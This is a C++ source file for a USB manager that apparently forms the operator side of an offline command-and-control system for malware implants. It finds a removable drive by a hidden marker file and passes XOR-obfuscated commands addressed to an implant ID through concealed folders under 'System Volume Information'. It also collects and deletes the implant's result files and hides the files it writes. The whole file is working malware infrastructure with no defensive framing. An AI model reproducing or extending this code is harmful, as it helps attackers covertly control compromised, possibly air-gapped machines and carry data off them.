#include "usb/manager.h"
#include "utils/helpers.h"
#include <filesystem>
#include <fstream>
#include <iostream>
#include <iterator>
#include <chrono>
#include <windows.h>

namespace fs = std::filesystem;

USBManager::USBManager()
    : usbDriveLetter_(), usbAutoDetect_(true), key_("OfflineC2Key") {
}

USBManager::~USBManager() = default;

void USBManager::SetUSBDriveLetter(const std::string& driveLetter) {
    usbDriveLetter_ = driveLetter;
}

std::string USBManager::GetUSBDriveLetter() const {
    return usbDriveLetter_;
}

bool USBManager::HasAuthorizedUSB() const {
    return !usbDriveLetter_.empty();
}

USBManager::USBDriveInfo USBManager::GetDriveInfo() const {
    USBDriveInfo info;
    info.authorized = HasAuthorizedUSB();
    info.driveLetter = usbDriveLetter_;

    if (!info.authorized) return info;

    std::wstring root = DriveRoot();
    root += L"\\";

    ULARGE_INTEGER freeBytes;
    ULARGE_INTEGER totalBytes;
    ULARGE_INTEGER freeBytesAvailable;

    if (GetDiskFreeSpaceExW(root.c_str(), &freeBytesAvailable, &totalBytes, &freeBytes)) {
        info.totalBytes = totalBytes.QuadPart;
        info.freeBytes = freeBytes.QuadPart;
    }

    return info;
}

bool USBManager::DetectAuthorizedUSB() {
    for (wchar_t drive = L'A'; drive <= L'Z'; drive++) {
        wchar_t root[4] = { drive, L':', L'\\', 0 };
        if (GetDriveTypeW(root) != DRIVE_REMOVABLE) continue;

        std::wstring authPath = std::wstring(root) +
                               L"System Volume Information\\_config_\\authorized.dat";
        if (GetFileAttributesW(authPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            usbDriveLetter_ = std::string(1, (char)drive) + ":";
            return true;
        }
    }
    return false;
}

std::vector<std::string> USBManager::ReadUSBResults() {
    std::vector<std::string> results;
    if (!EnsureDriveSelected()) return results;

    std::wstring cache = CachePath();
    try {
        if (!fs::exists(cache)) return results;

        for (auto& entry : fs::directory_iterator(cache)) {
            if (entry.path().extension() != L".dat") continue;

            std::ifstream file(entry.path(), std::ios::binary);
            if (!file) continue;

            std::string data((std::istreambuf_iterator<char>(file)),
                            std::istreambuf_iterator<char>());
            results.push_back(data);
            file.close();
            fs::remove(entry.path());
        }
    } catch (...) {
    }

    return results;
}

bool USBManager::SendCommandToUSB(const std::string& implantId, const std::string& command) {
    if (!EnsureDriveSelected()) return false;

    std::wstring returnPath = ReturnPath();
    try {
        fs::create_directories(returnPath);

        auto now = std::chrono::system_clock::now();
        auto ts = std::chrono::duration_cast<std::chrono::milliseconds>(
            now.time_since_epoch()).count();

        std::string filename = std::to_string(ts) + ".cmd";
        fs::path filePath = returnPath;
        filePath /= std::wstring(filename.begin(), filename.end());

        std::string encrypted = utils::XOREncrypt(command, key_);
        std::ofstream file(filePath, std::ios::binary);
        if (!file) return false;
        file.write(encrypted.c_str(), encrypted.size());
        file.close();

        SetFileAttributesW(filePath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        return true;
    } catch (...) {
        return false;
    }
}

std::vector<std::string> USBManager::PollResults() {
    if (usbAutoDetect_) {
        DetectAuthorizedUSB();
    }
    return ReadUSBResults();
}

std::string USBManager::XOREncrypt(const std::string& data, const std::string& key) {
    return utils::XOREncrypt(data, key);
}

void USBManager::SetAutoDetect(bool enabled) {
    usbAutoDetect_ = enabled;
}

bool USBManager::IsAutoDetectEnabled() const {
    return usbAutoDetect_;
}

bool USBManager::EnsureDriveSelected() {
    if (!usbDriveLetter_.empty()) return true;
    if (usbAutoDetect_) return DetectAuthorizedUSB();
    return false;
}

std::wstring USBManager::DriveRoot() const {
    if (usbDriveLetter_.empty()) return L"";
    std::wstring root;
    root.push_back((wchar_t)usbDriveLetter_[0]);
    root += L":\\";
    return root;
}

std::wstring USBManager::CachePath() const {
    return DriveRoot() + L"System Volume Information\\_cache_";
}

std::wstring USBManager::ReturnPath() const {
    return DriveRoot() + L"System Volume Information\\_return_";
}
